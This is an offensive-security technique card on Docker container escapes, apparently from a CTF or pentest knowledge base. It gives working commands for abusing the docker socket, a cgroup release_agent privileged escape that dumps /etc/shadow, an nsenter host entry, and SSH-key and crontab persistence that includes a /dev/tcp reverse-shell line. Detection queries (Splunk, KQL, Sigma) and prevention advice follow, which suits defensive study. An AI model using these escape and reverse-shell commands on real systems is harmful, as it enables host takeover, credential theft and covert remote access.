name: Docker Container Escape - Privileged & Socket Abuse
description: Docker container escapes exploit misconfigurations like privileged mode, mounted Docker socket, excessive capabilities, or host filesystem mounts. If you land in a container, these techniques break out to the host. The Docker socket mount is the most common escape vector in CTFs and real environments.
notes:
=== AM I IN A CONTAINER? ===
  # Check indicators:
  cat /proc/1/cgroup | grep docker
  ls -la /.dockerenv
  hostname  # Random hex = container
  cat /proc/self/mountinfo | grep docker

=== DOCKER SOCKET ESCAPE ===
  # If /var/run/docker.sock is mounted:
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  # Or without docker CLI:
  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
  # Create container with host mount:
  curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" http://localhost/containers/create -d "{"Image":"alpine","Cmd":["chroot","/mnt","sh"],"Binds":["/:/mnt"],"Tty":true}"

=== PRIVILEGED MODE ESCAPE ===
  # If running --privileged:
  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  host_path=$(sed -n "s/.*\perdir=\([^,]*\).*/\1/p" /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgrp/release_agent
  echo "#!/bin/sh" > /cmd
  echo "cat /etc/shadow > $host_path/output" >> /cmd
  chmod a+x /cmd
  sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
  cat /output

=== CAPABILITIES ABUSE ===
  # Check capabilities:
  capsh --print
  # CAP_SYS_ADMIN: mount host filesystem
  # CAP_SYS_PTRACE: attach to host processes
  # CAP_NET_ADMIN: manipulate host networking

=== HOST PID NAMESPACE ===
  # If --pid=host:
  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

=== WRITABLE HOST MOUNT ===
  # If host dirs are mounted:
  # Write SSH key:
  echo "ssh-rsa AAA..." >> /host_mount/root/.ssh/authorized_keys
  # Write cron job:
  echo "* * * * * root bash -i >& /dev/tcp/<ip>/<port> 0>&1" >> /host_mount/etc/crontab

recommended.note: Kubernetes privileged pod escape for K8s environments.

defense.why_it_works: Privileged containers share the host kernel and have full access to host devices. Mounted Docker sockets allow creating new containers with host access. Excessive capabilities grant kernel-level operations.
defense.prerequisites: Shell inside a misconfigured container (privileged, socket mounted, or excessive capabilities).
defense.impact: Full host access from within a container; root on the host system.
defense.detection: [MITRE T1611] New container creation with host mounts; privileged container execution; nsenter/chroot from container context.
defense.artifacts: Docker daemon logs showing host volume mounts; container creation events; nsenter process execution.
defense.splunk_spl:
index=linux (sourcetype=docker OR sourcetype=syslog) ("--privileged" OR "docker.sock" OR "nsenter" OR "chroot /mnt")
| table _time, host, process, message
defense.sentinel_kql:
Syslog
| where SyslogMessage has_any ("nsenter", "chroot /mnt", "docker.sock", "--privileged")
| project TimeGenerated, HostName, SyslogMessage
defense.prevention: Never run containers in privileged mode; do not mount Docker socket; use rootless containers; drop unnecessary capabilities; use gVisor/Kata containers.

detections.name: Docker container escape attempt
detections.logic:
title: Docker Container Escape via nsenter or Socket
status: experimental
logsource:
  product: linux
  category: process_creation
detection:
  selection_nsenter:
    Image|endswith: /nsenter
    CommandLine|contains: "--target 1"
  selection_socket:
    CommandLine|contains:
      - "docker.sock"
      - "chroot /mnt"
  condition: selection_nsenter or selection_socket
level: critical
detections.false_positives: Legitimate container management tools; orchestrator health checks
detections.tuning: Any nsenter targeting PID 1 from within a container is almost certainly an escape attempt
